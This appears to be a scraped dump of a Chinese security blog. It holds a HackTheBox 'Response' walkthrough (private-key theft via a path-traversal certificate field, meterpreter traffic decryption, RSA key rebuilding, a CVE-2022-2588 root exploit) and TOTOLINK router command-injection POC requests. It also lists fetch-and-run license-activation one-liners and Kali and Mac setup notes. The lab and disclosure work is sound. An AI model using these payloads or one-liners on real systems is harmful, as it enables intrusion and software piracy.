(full name) [Some-State]:../../../.ssh/id_rsaLocality Name (eg, city) []:Organization Name (eg, company) [Internet Widgits Pty Ltd]:Organizational Unit Name (eg, section) []:Common Name (e.g. server FQDN or YOUR name) []:10.10.14.78Email Address []:Please enter the following &#x27;extra&#x27; attributesto be sent with your certificate requestA challenge password []:An optional company name []: ──(kali㉿kali)-[~/HTB/Response] └─$ openssl x509 -req -in server.csr -out server.crt -signkey server.key -days 3650 Certificate request self-signature ok subject=C = AU, ST = ../../../.ssh/id_rsa, O = Internet Widgits Pty Ltd, CN = 10.10.14.78 ┌──(kali㉿kali)-[~/HTB/Response] └─$ cat server.key &gt;&gt; server.crt #创建https.py https.py 12345678import http.server, sslserver_address = (&#x27;10.10.14.78&#x27;,443)httpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile=&#x27;server.crt&#x27;, ssl_version=ssl.PROTOCOL_TLS)httpd.serve_forever() 搭建dns服务12345678910sudo docker run -d\\ --name dnsmasq \\ --restart always \\ -p 10.10.14.78:53:53/udp \\ -p 10.10.14.78:8080:8080 \\ -v /root/dnsmasq.conf:/etc/dnsmasq.conf \\ --log-opt &quot;max-size=100m&quot; \\ -e &quot;HTTP_USER=admin&quot; \\ -e &quot;HTTP_PASS=admin&quot; \\ jpillora/dnsmasq 修改dnsmasq.conf 12345678910log-queriesno-resolvserver=1.0.0.1server=1.1.1.1strict-orderserver=/company/10.0.0.1address=/reponse-test.htb/10.10.14.78address=/mail.response-test.htb/10.10.14.78localmxmx-host=response-test.htb,mail.response-test.htb,50 搭建smtp服务12345678910111213141516171819202122232425262728293031323334git clone https://github.com/ankraft/smtpproxy.gitcd smtpproxy mv smtpproxy.ini.example smtpproxy.ini# 修改smtpproxy.ini[config]port=25sleeptime=30waitafterpop=5debuglevel=0deleteonerror=true[logging]file=smtpproxy.logsize=1000000count=10level=INFO[reports@response.htb]localhostname=response-test.htbsmtphost=10.10.14.78smtpsecurity=tlssmtpusername=usernamesmtppassword=passwordpopbeforesmtp=truepophost=pop.example.compopport=995popssl=truepopusername=usernamepoppassword=passwordpopcheckdelay=60returnpath=me@example.com[bar@localdomain.com&gt;]use=foo@localdomain.com 已经在发pdf了 12023/01/21 11:56:12 CMD: UID=1000 PID=53947 | python3 ./send_report.py 172.18.0.3 marie.w@response-test.htb output/scan_172.18.0.3.pdf python https.py python2 smtpproxy.py 123456┌──(root㉿kali)-[~/smtpproxy/msgs]└─# ls -liahtotal 68K2228303 drwxr-xr-x 2 root root 4.0K Jan 21 07:12 .2228234 drwxr-xr-x 5 root root 4.0K Jan 21 07:08 ..2228308 -rw------- 1 root root 60K Jan 21 07:12 tmpbx7ve7.msg 收到了消息（密集恐惧症可不看🙈） 把上面的数据放到一个文件内 123456789┌──(kali㉿kali)-[~/HTB/Response]└─$ nano base64_pdf┌──(kali㉿kali)-[~/HTB/Response]└─$ cat base64_pdf | base64 -d &gt; report.pdf ┌──(kali㉿kali)-[~/HTB/Response]└─$ lsbase64_pdf https.py report.pdf server.crt server.csr server.key 获得了私钥 1234#新建id_rsa并放入chmod 400 id_rsassh scryh@10.10.11.163 -i id_rsa 成功🎉 1234┌──(kali㉿kali)-[~/HTB/Response]└─$ ssh scryh@10.10.11.163 -i id_rsaWelcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)scryh@response:~$ Root权限法一 解析私钥流量分析123456scryh@response:~$ lsincident_2022-3-042 scanscryh@response:~$ cd incident_2022-3-042/scryh@response:~/incident_2022-3-042$ lscore.auto_update dump.pcap IR_report.pdfscryh@response:~/incident_2022-3-042$ 把后面两个文件下载到kali这份报告写了遭遇到了攻击，抓到了一些流量，meterpreter会话在zip文件中那么先分析流量这个人和我们一样，从悲惨的bob下手将二进制数据写入文件，并做逆向 12with open(&#x27;auto_update&#x27;,&#x27;wb&#x27;) as file: file.write(bytes.fromhex(&quot;&quot;)) 1234567891011121314151617181920212223242526272829303132333435363738┌──(kali㉿kali)-[~/HTB/Response]└─$ gdb auto_update core.auto_update GNU gdb (Debian 12.1-4+b1) 12.1Copyright (C) 2022 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.Type &quot;show copying&quot; and &quot;show warranty&quot; for details.This GDB was configured as &quot;x86_64-linux-gnu&quot;.Type &quot;show configuration&quot; for configuration details.For bug reporting instructions, please see:&lt;https://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at: &lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type &quot;help&quot;.Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...Reading symbols from auto_update...warning: Can&#x27;t open file /dev/shm/auto_update during file-backed mapping note processingwarning: exec file is newer than core file.[New LWP 2901][New LWP 2903]--Type &lt;RET&gt; for more, q to quit, c to continue without paging--Core was generated by `./auto_update&#x27;.#0 0x00007f5090a77f48 in __syscall ()[Current thread is 1 (LWP 2901)](gdb) thread apply all btThread 2 (LWP 2903):#0 0x00007f5090a77f48 in __syscall ()#1 0x00007f5090a7ae24 in __timedwait_cp ()#2 0x0000000000000000 in ?? ()Thread 1 (LWP 2901):#0 0x00007f5090a77f48 in __syscall ()#1 0x00007f5090a6d432 in select ()#2 0x0000000000000000 in ?? () 用工具解密也行 1bulk_extractor -S scan_aes_128=1 core.auto_update -o aes 12345678┌──(kali㉿kali)-[~/HTB/Response/aes]└─$ cat aes_keys.txt# BANNER FILE NOT PROVIDED (-b option)# BULK_EXTRACTOR-Version: 2.0.0# Feature-Recorder: aes_keys# Filename: core.auto_update# Feature-File-Version: 1.11687472 f2 ... c5 AES256 解析TCP 在wireshark中打开pcap 查找 tcp.port &#x3D;&#x3D; 4444 查看会话“跟随 TCP 流” 显示数据格式改为raw 将第一个 zip 的所有数据包复制并粘贴到文件中（45 个 TCP 流数据包）到2571行 将所有复制的文件加入一行（删除空格） 使用脚本 python 提取 payload 为第二个 zip 重复所有（4 个 TCP 流数据包） 123456789from meterpreter_traffic_parser import *from Crypto.Util.number import long_to_bytesdata = 0x...aes_key = b&#x27;\\xf2\\x00...\\xc5&#x27; p = Packet(long_to_bytes(data), aes_key)p.describe() 获得两个payload 1234567类型：TLV_META_TYPE_RAW，TLV_TYPE_CHANNEL_DATA长度：1048584有效负载：b&#x27;PK\\x03\\x04 \\x00\\x00\\x00\\x00\\x00\\xb4Tn类型：TLV_META_TYPE_RAW，TLV_TYPE_CHANNEL_DATA长度：225970有效负载：b&#x27;\\xfa\\x8a&quot;\\x15\\xb3[BS\\x04~\\x15VV\\x80\\xbc!\\xb7)Q&lt;\\xce\\xe5\\xc0y1\\x19U\\xbe\\x94 \\xd4\\x1e\\xd6\\xd0D\\x12\\xb5S\\xe3\\xa6&quot;a@\\xfaXO\\x9a\\xb2V\\xf4\\xceb 导出两个zip文件 123456789payload1 = b&#x27;PK\\x03\\x04 \\x00\\x00\\x00\\x00\\x00\\xb4Tn....&#x27;with open(&quot;payload.zip&quot;, &quot;wb&quot;) as binary_file: # Write bytes to file binary_file.write(payload1)payload2 = b&#x27;\\xfa\\x8a&quot;\\x15\\xb3[BS\\x04~\\x15VV\\x80\\xbc!\\xb7)Q&lt;\\xce\\xe5\\xc0y1\\x1....&#x27;with open(&quot;payload2.zip&quot;, &quot;wb&quot;) as binary_file: # Write bytes to file binary_file.write(payload2) 获得公钥1234567891011121314151617181920212223242526┌──(kali㉿kali)-[~/HTB/Response]└─$ md5sum payload.zip payload2.zip5cddc0623e449109bf06d9342325000d payload.zip1976ecf8c406efd9b0cbbf2c1812b1ce payload2.zip ┌──(kali㉿kali)-[~/HTB/Response]└─$ du -b payload.zip payload2.zip1048576 payload.zip225962 payload2.zip ┌──(kali㉿kali)-[~/HTB/Response]└─$ cat payload.zip payload2.zip &gt; document.zip ┌──(kali㉿kali)-[~/HTB/Response]└─$ md5sum document.zip145b31e9b794e45e3b80f6e2634e13a4 document.zip ┌──(kali㉿kali)-[~/HTB/Response]└─$ unzip document.zipArchive: document.zip creating: Documents/ inflating: Documents/.tmux.conf inflating: Documents/Screenshot from 2022-06-15 13-37-42.png inflating: Documents/.vimrc inflating: Documents/bookmarks_3_14_22.html inflating: Documents/authorized_keys 解密私钥截图中的私钥 12345ntEd3KnWNpkbwp28vVgasUOq3CQBbDOQAAAMEAxwsaGXCZwMb/JH88XvGhu1Bo2zomIhaVMrbN5x4q3c7Z0u9gmkXO+NWMpX7T20l0OBEIhrW6DQOsxis/CrS5u69F6tUZjlUdNE1zIE7IFv2QurMwNL89/SnlQbe24xb+IjafKUaOPsNcpFakP4vxnKL+uw6qFoqRdSZyndgArZKDK26Z7ZzdV2ln2kyiLfokN8WbYxHeQ/7/jVBXf71BU1+Xg8X44njVp3Xf9gO6cYVaqb1xBsZ7bG8Warkycj7ZAAAADXJvb3RAcmVzcG9uc2UBAgMEBQ== RSA工作原理 找到两个不同的素数p和q：例如p=61和q=53 计算模数n=p*q：n=61*53=3233 计算phi(n)=(p-1)*(q-1)：phi(3233)=(61-1)*(53-1)=60*52=3120 找出一个e与 互质phi(n)且1 &lt; e &lt; phi(n)成立的数。一个技巧是选择e质数并检查e不除数phi(n)。e=17 计算的模乘逆&#96;d 加密&#x2F;解密消息m很简单： 加密：c(m) = m ^ e mod n 解密：m(c) = c ^ d mod n 那么要先找出n，之后获取p和q 1pip install openssh-key-parser 1234567891011121314151617181920┌──(kali㉿kali)-[~/HTB/Response] └─$ python -m openssh_key authorized_keys [ &#123; &quot;header&quot;: &#123; &quot;key_type&quot;: &quot;ssh-rsa&quot; &#125;, &quot;params&quot;: &#123; &quot;data&quot;: &#123; &quot;e&quot;: 65537, &quot;n&quot;: 3590773335101238071859307517426880690889840523373109884703778010764218094115323788644947218525265498470146994925454017059004091762707129955524413436586717182608324763300282675178894829982057112627295254493287098002679639669820150059440230026463333555689667464933204440020706407713635415638301509611028928080368097717646239396715845563655727381707204991971414197232171033109308942706448793290810366211969147142663590876235902557427967338347816317607468319013658232746475644358504534903127732182981965772016682335749548359468750099927184491041818321309183225976141161842377047637016333306802160159421621687348405702117650608558846929592531719185754360656942555261793483663585574756410582955655659226850666667278286719778179120315714973739946191120342805835285916572624918386794240440690417793816096752504556412306980419975786379416200263786952472798045196058762477056525870972695021604337904447201141677747670148003857478011217 &#125; &#125;, &quot;footer&quot;: &#123;&#125;, &quot;clear&quot;: &#123; &quot;key_type&quot;: &quot;ssh-rsa&quot;, &quot;comment&quot;: &quot;root@response&quot; &#125; &#125; ] 这样n,e就有了 🧨爆破(不推荐) 用Yafu找一下p和q 1.\\yafu-x64.exe &quot;factor(0x上面n的数据)&quot; 或者自己写个python脚本 1234567n = ....for i in range(10**(463-1), 10**463): if n % i == 0: print(&quot;找到了！q是: &quot;, i) break else: print(&quot;找不到&quot;) 🗺解密(👍推荐) 通过base64解码剩余的私钥 注意是6位编码 100c70b1a197099c0c6ff247f3c5ef1a1bb5068db3a2622169532b6cde71e2addced9d2ef609a45cef8d58ca57ed3db497438110886b5ba0d03acc62b3f0ab4b9bbaf45ead5198e551d344d73204ec816fd90bab33034bf3dfd29e541b7b6e316fe22369f29468e3ec35ca456a43f8bf19ca2febb0eaa168a917526729dd800ad92832b6e99ed9cdd576967da4ca22dfa2437c59b6311de43feff8d50577fbd41535f9783c5f8e278d5a775dff603ba71855aa9bd7106c67b6c6f166ab932723ed9 将获得的16进制转换成10进制就是我们要得到的q了 11874049613140184843621060844430875438039715136676390587014490642667648348834729578670572218770675017671955165909510372680231227997794797813783251855034499318060383466632797554895089403256742241869718483308458055165937168105025970618417112700682332538743333548471395327848077917895144087346832755607400573406688527717696386155103840198329730569043884613339720346942456798464865298511514240849350597034988561850631574781811925376637626743947768533920575522310602457 那么p &#x3D; n &#x2F;&#x2F; q就可以算出了 1pip install pyasn1==0.4.5 用一个工具包 rsatool 12┌──(kali㉿kali)-[~/HTB/Response/破解私钥]└─$ python rsatool.py -f PEM -o private.pem -p 得出的结果 -q 得出的结果 -e 65537 -n没什么问题就连上试试看 1234567891011┌──(kali㉿kali)-[~/HTB/Response/破解私钥]└─$ chmod 400 private.pem ┌──(kali㉿kali)-[~/HTB/Response/破解私钥]└─$ ssh root@10.10.11.163 -i private.pemWelcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)root@response:~# whoamirootroot@response:~# lsdocker docs_backup.zip ldap root.txt snaproot@response:~# 法二 CVE漏洞利用https://github.com/Markakd/CVE-2022-2588.git 1234567891011121314151617181920212223242526272829303132scryh@response:~$ chmod +x exp_file_credential scryh@response:~$ ./exp_file_credential self path /home/scryh/./exp_file_credential prepare done Old limits -&gt; soft limit= 14096 hard limit= 14096 starting exploit, num of cores: 2 defrag done spray 256 done freed the filter object 256 freed done double free done spraying files found overlap, id : 126, 134 start slow write closed overlap got cmd, start spraying /etc/passwd write done, spent 2.834875 s should be after the slow write spray done succeedscryh@response:~$ head -n 4 /etc/passwduser:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:/root/root:/bin/bashroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinscryh@response:~$ su userPassword: k8sntSoh7jhsc6lwspjsU.# whoamiuser# cat /root/root.txt4*****************************3#","tags":["渗透测试","HackThebox"],"categories":["靶场笔记"]},{"title":"Shambles初体验&Totolink漏洞","path":"/2023/09/02/shambles-01/","content":"想找一个易上手、好看的UI、现代化的逆向工具，刷B站的时候看到了Shambles这个工具，便尝试使用一下。本篇文章主要介绍shambles上手体验以及Totolink漏洞复现及研究。 起因想找一个易上手、好看的UI、现代化的逆向工具，刷B站的时候看到了Shambles这个工具，便尝试使用一下。本篇文章主要介绍shambles上手体验以及Totolink漏洞复现及研究。[ 作者水平有限，如有写错之处恳请指出] 上手体验获得使用资格之后按照邮箱上的信息和授权码进行登录。[建议在良好的网络环境下使用] 主页面分为本地和云端(上传)，本文先介绍上传云端的功能。 点击上传并分析固件 本文所使用的固件信息: 厂商:totollink 型号:X5000R 大小:8.6MB 版本:V9.1.00u.6118 MD5:497788b96788270336160fec37d93660 指令集:MIPS 下载地址: https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/218/ids/36.html 点击生成报告，输入固件信息，[注意只演示如何操作，本文固件已上传完毕，可以在本地文件列表查看] 完成后界面会恢复到上传前的样子，不用担心，点击左上角浏览所有即可看到刚刚上传的固件。 等待解包完成即可 可以看到在云端固件列表中，已经有了分析报告[注意，目前shambles1.2.2版本在解包中可能由于有些字符串比较特殊或者比较多，打包的时候超出内存限制，导致解包出现错误] 486个高危31个中危，1825个低危，点击右侧的克隆至本地即可开始研究工作 点击左侧的本地文件 工作窗口工作窗口分为4大板块，分别是工具栏，文件树，固件信息（主面板），漏洞列表 同时还能够通过固件相似度可视化，发现相似固件，更方便于查找通杀漏洞 Bindiff固件对比 使用Bindiff功能就能对比两个固件的自动化对比，具体功能可以查看下面的视频进行学习 https://www.bilibili.com/video/BV14V411V7ui/ 虚拟机当然，你还会注意到右侧的漏洞下还有虚拟机 [注：往常都是用QEMU来模拟环境进行测试，如果不知道如何用QEMU模拟环境可以查看这个文章] https://boschko.ca/qemu-emulating-firmware/ 没错！这个shambles还可以模拟固件环境，做到挖洞一站式体验 点击左上角的小箭头，切换到云端模式，再点击同步模拟器，等待ing 具体的操作教程可以观看这个视频 https://www.bilibili.com/video/BV18g4y1j7KX/ 挖洞那么最令人心动的就是漏洞列表板块了，shambles能够自动挖掘潜在漏洞的信息并十分清晰地列出 在右侧可以看到具有命令执行的函数漏洞，双击函数便可以定位，F5可以将汇编代码调整为便于我们阅读的类C语言模式 使用chatgpt3.5也可以进行验证 使用POC进行攻击 123456789101112131415POST /cgi-bin/cstecgi.cgi HTTP/1.1Host: 192.168.0.1User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestContent-Length: 82Origin: http://192.168.0.1Connection: closeReferer: http://192.168.0.1/advance/traceroute.html?time=1679125513355Cookie: SESSION_ID=2:1679122532:2&#123;&quot;command&quot;:&quot;127.0.0.1; pwd &gt; /tmp/1.txt;&quot;,&quot;num&quot;:&quot;4&quot;,&quot;topicurl&quot;:&quot;setTracerouteCfg&quot;&#125; 同样再选择一个漏洞 在setOpModeCfg中包含命令插入漏洞，该漏洞允许攻击者通过“hostName”参数执行任意命令 1234567891011121314151617181920POST /cgi-bin/cstecgi.cgi HTTP/1.1Host: 192.168.0.1User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestContent-Length: 90Origin: http://192.168.0.1Connection: closeReferer: http://192.168.0.1/advance/time.html?time=1679126798322Cookie: SESSION_ID=2:1679122532:2&#123;&quot;proto&quot;:&quot;1&quot;,&quot;hostName&quot;:&quot;&#x27;; pwd &gt; /tmp/1.txt;&#x27; &quot;,&quot;topicurl&quot;:&quot;setOpModeCfg&quot;&#125; references: title: ‘TOTOLINK X5000R’url: https://github.com/Kazamayc/vuln/tree/main/TOTOLINK/X5000R/","tags":["工具体验","渗透测试"],"categories":["渗透测试"]},{"title":"导航","path":"/nav/index.html","content":"如果有优秀的网站可以在评论区推荐一下 在线影视哔嘀影视综合性站点Libvio海外剧为主AGE动漫追番必备Freevod海外站点 图片工具哩布哩布AI免费的生成图片AI网站sdxlturbo超快速的文生图网站Pixian去除背景神器IPFS图床永久、去中心化、CDN的图床Canva制作封面、海报神器 Drive神器云鸽传送内网、外网传送信息&文件神器B站下载B站下载工具 | 极简纯净Wormhole简单，私密的端到端文件分享transfer.zipP2P传输文件屋舍免费文件分享 资源分享云盘资源论坛阿里云盘资源论坛Tacit0924阿里云盘影视资源liber3电子书搜索引擎基于Web3的电子书搜索引擎太阳网盘安卓TV软件合集 软件安卓Newpipe阅读⏭️阅读书源LibvioNekoBoxTVBoxNekogramgkdk9-mailvia我的电视 WindowsMAS_AIO.cmd 系统&amp;Office激活脚本 1irm https://massgrave.dev/get | iex IDM安装包官网链接IDM激活脚本 1iex(irm is.gd/idm_reset) PixPinClash Verge"},{"title":"友链","path":"/friends/index.html","content":"如何申请友链 第一步:满足条件合法的、非营利性、无商业广告、无木马植入。已在友链页添加本站。第二步:新建issue新建Github Issue按照模板格式填写并提交。为了提高图片加载速度，建议优化头像哦。第三步:添加友链并等待管理员审核待管理员审核通过，添加了Action标签后，回来刷新即可生效。如果您需要更新自己的友链，请直接修改 issue 内容，大约 3 分钟内生效，无需等待博客更新。"},{"title":"关于","path":"/about/index.html","content":"喜欢折腾、研究、看看天的少年登高壮观图杜甫楼船夜雪瓢泼大，洗清铜尽汗流垂。海阔凭鱼跃，天高任鸟飞。秦皇岛外黄沙百战穿金甲，不破楼兰终不还。赤日炎炎何时候，把酒临风看牧骥。向往自由文章项目留言GitHub"},{"title":"Pwn","path":"/wiki/Kali/ctf-pwn.html","content":"pwntools1234sudo apt-get updatesudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential -ypython3 -m pip install --upgrade pippython3 -m pip install --upgrade pwntools 打开 python，输入 from pwn import * 看看是否有报错即可。 gdb1sudo apt install gdb -y peda&#x2F;pwngdb&#x2F;gef这是常见的 gdb 的三个插件，配合 gdb 使用可以提升调试效率。 pwndbg1234cd ~git clone https://github.com/pwndbg/pwndbgcd pwndbg./setup.sh peda1234cd ~git clone https://github.com/longld/peda.git ~/pedaecho &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinitecho &quot;DONE! debug your program with gdb and enjoy&quot; gef123cd ~wget -q -O ~/.gdbinit-gef.py https://github.com/hugsy/gef/raw/master/gef.pyecho source ~/.gdbinit-gef.py &gt;&gt; ~/.gdbinit gdb切换插件12vim ~/.gdbinit#把所有内容注释掉 123cd /usr/local/sbinsudo touch gdb.shsudo vim gdb.sh 粘贴下面的脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#!/bin/bashfunction Mode_change &#123; name=$1 gdbinitfile=~/.gdbinit #这个路径按照你的实际情况修改 # gdbinitfile=/root/Desktop/mode peda=&quot;source ~/peda/peda.py&quot; #这个路径按照你的实际情况修改 gef=&quot;source ~/.gdbinit-gef.py&quot; #这个路径按照你的实际情况修改 pwndbg=&quot;source ~/pwndbg/gdbinit.py&quot; #这个路径按照你的实际情况修改 sign=$(cat $gdbinitfile | grep -n &quot;#this place is controled by user&#x27;s shell&quot;) #此处上面的查找内容要和你自己的保持一致 pattern=&quot;:#this place is controled by user&#x27;s shell&quot; number=$&#123;sign%$pattern&#125; location=$[number+2] parameter_add=$&#123;location&#125;i parameter_del=$&#123;location&#125;d message=&quot;TEST&quot; if [ $name -eq &quot;1&quot; ];then sed -i &quot;$parameter_del&quot; $gdbinitfile sed -i &quot;$parameter_add $peda&quot; $gdbinitfile echo -e &quot;Please enjoy the peda! &quot; elif [ $name -eq &quot;2&quot; ];then sed -i &quot;$parameter_del&quot; $gdbinitfile sed -i &quot;$parameter_add $gef&quot; $gdbinitfile echo -e &quot;Please enjoy the gef! &quot; elif [ $name -eq &quot;3&quot; ];then sed -i &quot;$parameter_del&quot; $gdbinitfile sed -i &quot;$parameter_add $pwndbg&quot; $gdbinitfile echo -e &quot;Please enjoy the pwndbg! &quot; else sed -i &quot;$parameter_del&quot; $gdbinitfile echo -e &quot;Please enjoy pure gdb!&quot; fi &#125; echo -e &quot;Please choose one mode of GDB? 1.peda 2.gef 3.pwndbg 4.pure_gdb&quot; read -p &quot;Input your choice:&quot; num if [ $num -eq &quot;1&quot; ];then Mode_change $numelif [ $num -eq &quot;2&quot; ];then Mode_change $numelif [ $num -eq &quot;3&quot; ];then Mode_change $numelif [ $num -eq &quot;4&quot; ];then Mode_change $numelse echo -e &quot;Error! Pleasse input right number!&quot;fi gdb $1 $2 $3 $4 $5 $6 $7 $8 $9 添加权限 1sudo chmod -R 777 gdb.sh 然后便可以使用 1234567g4ti0r@XiaoxinPro13:~$ gdb.shPlease choose one mode of GDB?1.peda 2.gef 3.pwndbg 4.pure_gdbInput your choice:3Please enjoy the pwndbg!pwndbg&gt; 32位程序支持1sudo apt-get install libc6-dev-i386 -y arm 的 pwn 环境 qemu1sudo apt-get install qemu qemu-system qemu-user-static binfmt-support -y 安装依赖： 123sudo apt-get install -y gcc-arm-linux-gnueabisudo apt-get install qemu libncurses5-dev gcc-arm-linux-gnueabi build-essential synaptic gcc-aarch64-linux-gnu -y LibcSearcher泄露 libc 库中函数的偏移的库，建议安装，可以节省时间，提高效率。 12345sudo pip install capstonecd ~git clone https://github.com/lieanu/LibcSearcher.gitcd LibcSearchersudo python3 setup.py develop ROPgadget 和 one_gadgetROPgadget 是用来找 gadget 的，one_gadget 用来寻找 libc 库中的 execve (‘&#x2F;bin&#x2F;sh’, NULL, NULL) 可以一个 gadget 就可以 getshell，建议安装。 12345678910111213141516# 先安装Capstone,它是一个轻量级的多平台架构支持的反汇编架构。sudo apt-get install python-capstone -y #安装ROPgadgetcd ~git clone https://github.com/JonathanSalwan/ROPgadget.git #进入cd ROPgadget # 下载好ROPgadget解压，并进入文件夹中sudo python3 setup.py install #安装one_gadgetsudo apt install ruby -ysudo gem install one_gadget 最后： 12sudo apt-get updatesudo apt-get upgrade -y"},{"title":"系统安装","path":"/wiki/Kali/first.html","content":"版本选择虚拟机（推荐）ISO"},{"title":"Web","path":"/wiki/Kali/ctf-web.html","content":"目录扫描12345sudo apt install dirsearch -y# Feroxbuster &amp; SecListssudo apt install feroxbuster -y# Rockyousudo gzip -d /usr/share/wordlists/rockyou.txt.gz"},{"title":"HackTheBox","path":"/wiki/Kali/htb.html","content":"平台介绍OpenVPN连接靶机下载配置文件之后 1sudo openvpn lab_name.ovpn 网络流量转发很有用的一个技巧比如说在Vmware中开启nat的kali虚拟机使用了openvpn连接上了靶机内网我想要windows也加入这个内网怎么办呢？ 12sudo echo 1 &gt; /proc/sys/net/ipv4/ip_forwardcat /proc/sys/net/ipv4/ip_forward 1sudo iptables -A FORWARD -i tun0 -m state --state RELATED, ESTABLISHED -j ACCEPT 1sudo iptables -A FORWARD -i eth0 -o tun0 -j ACCEPT 然后查看自己的eth0IP地址 比如 192.168.58.230 1sudo iptables -t nat -A POSTROUTING -s 192.168.58.0/24 -o tun0 -j MASQUERADE 转到windows中打开cmd 1route add 10.10.10.0/23 mask 255.255.254.0 192.168.58.230 然后ping一下靶机地址尝试能不能ping通 🎉🎉🎉大功告成！在windows网络适配器中修改ipv4的dns改为 代理加速想要终端+网页代理加速其实很简单，不用在kali中安装clash或者Proxychains代理物理机windows或者mac在clash中打开tun模式，或者其他代理软件中的增强模式，虚拟机中使用nat模式，就可以实现linux中终端和网页都加速了"},{"title":"终极配置教程","path":"/wiki/Kali/index.html","content":"Kali Linux 是一个基于 Debian 的开源 Linux 发行版，适用于各种信息安全任务，例如渗透测试、安全研究、计算机取证和逆向工程。"},{"title":"日常软件","path":"/wiki/Mac/dailyapp.html","content":"前置工作允许安装任意来源的 App1sudo spctl --master-disable 然后前往系统偏好设置👉安全性与隐私👉点击左下角的小锁 安装 Xcode Command Line Tools工具依赖 1xcode-select --install HomeBrew安装1/bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)&quot; 国内环境安装命令 1/bin/bash -c &quot;$(curl -fsSL https://gitee.com/ineo6/homebrew-install/raw/master/install.sh)&quot; 安装完成后根据提示，运行下面的命令 12echo &#x27;eval &quot;$(/opt/homebrew/bin/brew shellenv)&quot;&#x27; &gt;&gt; ~/.zprofileeval &quot;$(/opt/homebrew/bin/brew shellenv)&quot; 安装一下cask便于后面软件的安装 1brew install cask 常用命令更新Homebrew 搜索相关包 卸载软件 查看已安装的软件 软件商店appstorrent俄罗斯的网站MacYY国人运营的良心网站xmac.app第一个网站的资源，便于搜索下载 防火墙首先要安装的就是防火墙，Mac自带的防火墙只能防御进入Mac的流量，但是遇到流氓软件向服务器上传我们的隐私数据就防御不了。同时也可以过滤广告哦。我们可以选择两个软件，二选一即可 Little Snitch（许可证一次收费）官网下载地址 许可证可以在淘宝进行购买，按需购入 LuLu（开源，免费）LuLu是一个开源的防火墙工具安装也很简单 1brew install --cask lulu 保持默认选项 有程序发起请求时，会跳出弹窗，我们只需要选择放行或者阻止即可，设置过一次或者配置好规则就可以一劳永逸附上常见的阻止🚫规则 blockyouxlist，勾选然后粘贴链接即可 1Password非常值得入手的密码管理工具，只需要记住一个密码就可以自动保存、保存填写网站、SSH密钥、加密钱包等密码淘宝购入年费会员也不贵，安全性也不错，全平台通用 1brew install --cask 1password 官网链接 RaycastRaycast是一个启动器，可以高效打开文件、软件、网站并执行各种便捷操作，可以代替Mac 自带的 「焦点（Spotlight）」同样brew安装 1brew install --cask raycast 也可以官网下载dmg文件官网下载地址 插件以下是一些推荐的插件1password chatgptChatgpt免费API申请 VscodeKill Process Battery一个开源的电池保护工具 1brew install --cask battery 使用方法电池充到80停止 Keka压缩解压工具 1brew install --cask keka 官网下载 IINA视频播放器 1brew install --cask iina shottr纯净的截屏工具长截图，ocr，智能打码，贴图，取色等功能 1brew install --cask shottr 官网下载 ishot国产多功能截屏工具长截图，录音，录屏，ocr，贴图，取色等功能官方下载 Bob or TTime两款都是优秀的翻译软件，可以划词翻译和截图翻译Bob TTimeBob是老牌mac工具，目前在Appstore可以下载，而github版本已停止维护可以下载免费的bob插件使用 TTime是新晋的开源工具，可以自己配置ocr和翻译的api，可以申请大厂的api接口，都有免费额度，足够个人使用了 Qspace一款多窗口布局的文件管理工具 官方下载免费版与专业版的区别 Rectangle快捷键分屏 1brew install --cask rectangle Obsidian优秀的笔记工具可以更改主题，安装各种插件同步可以用github官网下载 KeyboardHolder有些时候我们会遇到总是频繁切换中英文输入法，或者标点的场景使用这款工具就可以记住场景，自动切换 1brew install --cask keyboardholder Motrix开源的下载器，支持HTTP, FTP, BitTorrent, Magnet等 1brew install --cask motrix PDF ExpertMac上非常优秀的Pdf编辑、查看、管理工具官网 PDFGear免费的PDF编辑、阅读工具自带AI阅读PDF，OCR识别官网 Wechat微信AppStore下载官网下载 Telegram1brew install --cask telegram Discord1brew install --cask discord NetNewsWireRSS阅读器 1brew install --cask netnewswire 鼠须管Squirrel输入法Rime输入法开源，高度自定义 1brew install --cask squirrel 配置自动化配置脚本👉https://github.com/Mark24Code/rime-auto-deploy/tree/main 安装依赖ruby31brew install ruby 执行下面的代码123git clone --depth=1 https://github.com/Mark24Code/rime-auto-deploy.git --branch latestcd rime-auto-deploy./installer.rb"},{"title":"终极配置教程","path":"/wiki/Mac/index.html","content":"本文为Mac配置教程文档，旨在解决大部分Mac问题 注意 由于Mac现在开始使用`Apple Silicon CPU`，所以本文的适用机器是Arm架构的MacBook、Mac mini等 参考资料: 国光的 macOS Ventura 13 优化配置（基于 ARM 平台） 地震”学”软件"},{"title":"系统配置","path":"/wiki/Kali/second.html","content":"先修改默认root密码 1sudo passwd root 输入密码，建议设置为kali用户kali的默认密码也是kali 环境配置自动化脚本可以选择下面的自动化脚本，开启ssh，换源，配置python2和python3环境，安装常用工具、字典，配置tmux，ad工具等 1wget 